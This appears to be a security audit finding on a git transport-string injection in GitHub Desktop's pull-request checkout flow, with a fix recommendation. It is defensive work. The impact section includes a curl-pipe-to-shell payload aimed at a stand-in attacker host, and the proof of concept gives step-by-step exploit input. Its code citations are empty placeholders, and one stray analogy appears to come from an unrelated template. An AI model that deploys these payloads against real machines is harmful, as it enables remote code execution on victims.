### Title
Unvalidated GitHub API `clone_url` is used to create a git remote and fetched, enabling git transport-string injection (`ext::`) - (File: `app/src/lib/stores/app-store.ts`, `app/src/lib/git/remote.ts`)

### Summary
When checking out a pull request from a fork, GitHub Desktop takes the `clone_url` field of the PR's `head.repo` object — returned as-is by the GitHub API/GHE server — and passes it unchecked into `git remote add` and then `git fetch`, with no scheme/format validation anywhere in the pipeline.

### Finding Description
`_findPullRequestBranch` receives `headCloneUrl` from the caller and, if no existing remote matches it, calls: [1](#0-0) 
straight into `addRemote`, which shells out to git with the raw string: [2](#0-1) 

The `headCloneUrl` value originates from `pullRequest.head.repo.clone_url` in `openPullRequestFromUrl` (deep-link flow) or `pullRequest.head.gitHubRepository.cloneURL` (UI flow): [3](#0-2) [4](#0-3) 

This is exactly a "GitHub API object" value per the valid-impact scope: it is server-supplied JSON that Desktop trusts implicitly (for GitHub Enterprise instances, or via a compromised/spoofed API endpoint, or MITM'd HTTP response for `api.github.com`-equivalent calls) with no format check (no restriction to `https://`/`git@` forms, no rejection of `ext::`, `fd::`, `file://`, or leading-dash "option-like" strings).

Immediately after adding the remote, Desktop fetches it: [5](#0-4) 
which invokes `git(['fetch', remote.name], ...)`. Git resolves `remote.name` to the configured URL and dispatches through the transport indicated by the URL scheme. Because this URL was written via `git remote add` (a "user-configured" remote, in git's own trust model) rather than obtained from a redirect or submodule URL, git's built-in protocol-allowlist protections (`protocol.<name>.allow`, meant to block `ext`/`file`/`ext::sh -c ...` style transport strings from untrusted sources) do **not** apply — those protections only gate protocols sourced from HTTP redirects or submodule configuration, not from locally-written remote config, even though the value that produced that local config came straight from an untrusted network response.

There is no `GIT_ALLOW_PROTOCOL` environment variable set anywhere in the codebase (confirmed via search), and `envForRemoteOperation` does not add any such restriction, so nothing in Desktop compensates for git's own scoping gap.

### Impact Explanation
If a malicious/compromised GitHub Enterprise server (or an attacker able to influence the API response, e.g. via a malicious proxy or MITM on an HTTP GHE deployment) returns a pull request whose `head.repo.clone_url` is a git "ext" transport string (e.g. `ext::sh -c "curl${IFS}evil.example/x|sh"`), the sequence `addRemote` → `_fetchRemote`/`fetchRefspec` results in **remote code execution** on the user's machine the moment they open or check out that pull request in Desktop — with no prompt, warning, or confirmation, and no code execution needed on the attacker's part beyond hosting a PR/API response. This matches the report's core pattern: the app blindly trusts external state (a "killed gauge" analog = a maliciously-crafted PR/API object) and performs a state-changing action (adding a remote + fetching it) without validating that the untrusted input is well-formed/safe, causing consequences the user never consented to.

### Likelihood Explanation
Reaching this code path only requires the victim to view/checkout a pull request whose fork repository is hosted on an attacker-controlled or compromised GitHub Enterprise server (or any environment where the `head.repo.clone_url` field in the PR API response can be attacker-influenced), which is squarely within the "attacker controls a GitHub API object" scope defined for this analysis. No local access, no prior malware, and no unnatural user steps are required — checking out a PR from a fork is a normal, expected Desktop workflow.

### Recommendation
Validate `clone_url`/`headCloneUrl` before passing it to `addRemote`/`setRemoteURL`: enforce it matches one of the supported, safe transports (`https://`, `git@...:`, `ssh://git@...`) via `parseRemote` in `app/src/lib/remote-parsing.ts` (already used elsewhere for URL matching) and reject anything else, including strings starting with `-` or containing `::`. Additionally, set `GIT_ALLOW_PROTOCOL=http:https:ssh:git` (or an equivalent restrictive allowlist) in the environment used for all git invocations (`envForRemoteOperation` and the default git execution environment) as defense-in-depth against transport-string smuggling.

### Proof of Concept
1. Stand up a malicious GitHub Enterprise-compatible API endpoint (or intercept/spoof the API response for a PR lookup).
2. Craft a pull request API response where `head.repo.clone_url` = `ext::sh -c "touch /tmp/pwned"` (or platform-equivalent payload).
3. Have the victim open this PR via the deep link `x-github-desktop-...://openRepo/...` flow (`openPullRequestFromUrl`) or via the "Checkout PR" UI action.
4. `_checkoutPullRequest` → `_findPullRequestBranch` runs `addRemote(repository, forkRemoteName, "ext::sh -c \"touch /tmp/pwned\"")`, writing this URL into `.git/config`.
5. The subsequent `_fetchRemote` call runs `git fetch <forkRemoteName>`, which git resolves to the `ext::` transport and executes the embedded shell command, achieving code execution on the victim's machine.
